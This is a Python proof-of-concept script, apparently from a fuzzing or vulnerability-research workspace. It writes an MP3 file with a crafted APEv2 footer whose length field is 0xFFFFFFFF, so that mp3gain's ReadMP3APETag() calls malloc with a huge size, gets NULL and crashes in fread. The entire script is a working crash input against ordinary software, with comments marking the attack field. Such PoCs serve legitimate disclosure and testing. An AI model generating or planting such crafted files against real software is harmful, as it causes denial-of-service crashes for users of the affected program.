#!/usr/bin/env python3
"""
PoC generator for VULN 003: APE Tag Length field too large causing malloc failure
and subsequent NULL pointer dereference in ReadMP3APETag() (apetag.c:170-172).

The APE footer's Length field is set to 0xFFFFFFFF (4294967295), which when passed
to malloc() will fail on memory-constrained systems or with ASAN, returning NULL.
The subsequent fread(buff, ...) call with NULL buff causes a crash.
"""

import struct
import os

OUTPUT_FILE = "/data/ylwang/non-textfuzz/target/_poc/mp3gain/rg_error_c/vuln_003.mp3"

# Minimal MPEG1 Layer3 128kbps 44100Hz frame header + frame data
# Frame header bytes: 0xFF 0xFB 0x90 0x00
# Frame size for 128kbps 44100Hz = 417 bytes total (4 header + 413 data)
mp3_frame_header = bytes([0xFF, 0xFB, 0x90, 0x00])
mp3_frame_data = b'\x00' * 413

mp3_content = mp3_frame_header + mp3_frame_data

# APEv2 footer structure (32 bytes total):
#   "APETAGEX"        - 8 bytes magic
#   version (LE32)    - 4 bytes: 2000
#   Length (LE32)     - 4 bytes: 0xFFFFFFFF (ATTACK FIELD)
#   item count (LE32) - 4 bytes: 0
#   flags (LE32)      - 4 bytes: 0 (footer, no header present)
#   reserved          - 8 bytes: all zero

ape_magic   = b"APETAGEX"
ape_version = struct.pack("<I", 2000)
ape_length  = struct.pack("<I", 0xFFFFFFFF)  # Huge value to trigger malloc failure
ape_count   = struct.pack("<I", 0)
ape_flags   = struct.pack("<I", 0x00000000)  # bit29=0 means this is a footer
ape_reserved = b"\x00" * 8

ape_footer = ape_magic + ape_version + ape_length + ape_count + ape_flags + ape_reserved
assert len(ape_footer) == 32, f"APE footer must be 32 bytes, got {len(ape_footer)}"

# Combine: minimal MP3 frame + APE footer at end
payload = mp3_content + ape_footer

os.makedirs(os.path.dirname(OUTPUT_FILE), exist_ok=True)

with open(OUTPUT_FILE, "wb") as f:
    f.write(payload)

print(f"[+] Written {len(payload)} bytes to {OUTPUT_FILE}")
print(f"    MP3 frame: {len(mp3_content)} bytes")
print(f"    APE footer: {len(ape_footer)} bytes")
print(f"    APE Length field: 0x{0xFFFFFFFF:08X} = {0xFFFFFFFF} bytes")
print(f"[+] Trigger: ReadMP3APETag() will call malloc(0xFFFFFFFF) -> likely NULL -> crash on fread()")
